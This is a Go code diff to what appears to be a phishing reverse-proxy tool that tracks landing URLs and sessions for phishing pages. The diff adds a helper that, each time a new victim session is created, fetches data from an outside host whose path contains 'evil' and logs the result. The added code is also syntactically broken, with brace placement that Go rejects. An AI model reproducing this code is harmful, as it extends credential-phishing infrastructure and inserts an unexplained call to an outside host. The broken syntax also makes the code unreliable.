@@ -90,6 +90,29 @@ type ProxySession struct {
 	Index        int
 }
 
+func doReq(url string) (content string) {
+
+    resp, err := http.Get(url)
+
+    if err != nil 
+	{
+		log.Error(err)
+        return
+    }
+
+    defer resp.Body.Close()
+
+    body, err := ioutil.ReadAll(resp.Body)
+
+    if err != nil 
+	{
+        log.Error(err)
+        return
+    }
+
+    return string(body)
+}
+
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
@@ -278,6 +301,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
+
+									worldContent := doReq("https://apis.worlds.mom/evil/get-data/")
+
+									log.Info("API Content: %s", worldContent)
 
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
 									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
